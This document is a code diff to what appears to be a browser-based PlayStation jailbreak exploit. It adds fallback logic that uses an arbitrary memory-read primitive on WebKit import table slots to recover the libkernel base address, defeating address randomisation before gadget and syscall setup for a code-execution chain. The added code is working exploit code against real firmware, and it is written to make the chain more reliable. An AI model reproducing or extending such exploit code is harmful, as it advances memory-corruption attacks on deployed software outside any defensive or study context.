@@ -115,10 +115,64 @@ async function prepare(p) {
     let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
     libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
 
+    // ===== [kbase-recovery — port of PSAITO d0bf84d] =====
+    // The guard slot is ONE equation; a wrong guard import/guard offset pair
+    // makes libKernelBase garbage and every syscall jumps into nowhere. The
+    // getpid/close/error GOT pairs (X1NON-verified on 13.40/13.60) each give
+    // an independent equation. If the primary base is out of band, try the
+    // candidates: the first in-band one replaces it, so a single wrong
+    // offset no longer kills the chain.
+    const KBASE_IN_BAND = function (v) {
+        try {
+            // libkernel lives in 0x800000000..0x8FFFFFFFF, page-aligned 0x4000
+            return !!(v && typeof v.hi === "number" && v.hi === 0x8
+                && ((v.low >>> 0) % 0x4000) === 0);
+        } catch (e) { return false; }
+    };
+    let kbaseRecoveredFrom = "";
+    try {
+        if (!KBASE_IN_BAND(libKernelBase)) {
+            jbmark("KBASE-INVALID", "guard-derived base out of band: 0x"
+                + libKernelBase.toString());
+            const cands = [];
+            if (typeof OFFSET_wk_getpid_import !== "undefined")
+                cands.push(["getpid", OFFSET_wk_getpid_import, OFFSET_lk_getpid_export]);
+            if (typeof OFFSET_wk_close_import !== "undefined")
+                cands.push(["close", OFFSET_wk_close_import, OFFSET_lk_close_export]);
+            if (typeof OFFSET_wk_error_import !== "undefined")
+                cands.push(["error", OFFSET_wk_error_import, OFFSET_lk_error_export]);
+            const parts = [];
+            for (const c of cands) {
+                try {
+                    const ptr = p.read8(libSceNKWebKitBase.add32(c[1]));
+                    const base = ptr.add32(0); // copy — do NOT mutate the slot value
+                    base.sub32inplace(c[2]);
+                    parts.push(c[0] + "=0x" + base.toString());
+                    if (!kbaseRecoveredFrom && KBASE_IN_BAND(base)) {
+                        libKernelBase = base;
+                        kbaseRecoveredFrom = c[0];
+                    }
+                } catch (e2) {
+                    parts.push(c[0] + "=FAULT");
+                }
+            }
+            jbmark("KBASE-CANDIDATES", parts.join(","));
+            if (kbaseRecoveredFrom) {
+                jbmark("KBASE-RECOVERED-FROM", kbaseRecoveredFrom + "=0x"
+                    + libKernelBase.toString());
+            } else {
+                jbmark("KBASE-NOT-RECOVERED", "no candidate in band — check the fw offset file");
+            }
+        }
+    } catch (e) {
+        jbmark("KBASE-RECOVERY-THREW", String(e && e.message || e).slice(0, 60));
+    }
+
     // once per run, before any racer exists
     jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
         + "-lk=0x" + libKernelBase.toString()
-        + "-lc=0x" + libSceLibcInternalBase.toString());
+        + "-lc=0x" + libSceLibcInternalBase.toString()
+        + (kbaseRecoveredFrom ? "-recovered-from=" + kbaseRecoveredFrom : ""));
 
     let gadgets = {};
     let syscalls = {};
